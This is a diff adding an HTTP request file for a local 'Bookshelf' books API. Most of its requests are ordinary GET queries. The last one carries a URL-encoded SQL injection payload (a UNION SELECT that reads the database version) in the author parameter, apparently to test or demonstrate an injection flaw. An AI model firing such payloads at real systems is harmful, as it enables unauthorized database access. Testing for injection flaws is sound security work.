@@ -1,0 +1,22 @@
+@Bookshelf_HostAddress = http://localhost:5038
+
+GET {{Bookshelf_HostAddress}}/api/books
+Accept: application/json
+###
+
+GET {{Bookshelf_HostAddress}}/api/books?author=rwel&title=lord
+Accept: application/json
+###
+
+
+GET {{Bookshelf_HostAddress}}/api/books/1
+Accept: application/json
+###
+
+
+GET {{Bookshelf_HostAddress}}/api/books?author=
+Accept: application/json
+###
+
+GET {{Bookshelf_HostAddress}}/api/books?author=%27%20UNION%20SELECT%20%271%27%2C%20version()%2C%20%272%27%2C%20%272024.12.01%27%20--
+Accept: application/json
